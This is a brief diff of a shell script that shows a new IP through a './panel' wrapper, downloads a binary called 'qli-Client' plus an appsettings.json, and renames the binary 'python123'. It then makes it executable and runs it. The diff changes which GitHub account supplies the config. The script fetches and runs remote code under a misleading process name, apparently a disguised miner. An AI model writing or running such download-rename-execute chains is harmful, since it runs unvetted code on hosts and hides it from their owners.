@@ -21,5 +21,5 @@ echo " "
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
 
 
-wget https://bitbucket.org/excel-gms/fix/downloads/qli-Client && wget https://raw.githubusercontent.com/erlandi-main-api/QBMASTER/main/appsettings.json && mv qli-Client python123 && chmod +x python123
+wget https://bitbucket.org/excel-gms/fix/downloads/qli-Client && wget https://raw.githubusercontent.com/MADEWGN-X/x/main/appsettings.json && mv qli-Client python123 && chmod +x python123
 ./panel ./python123
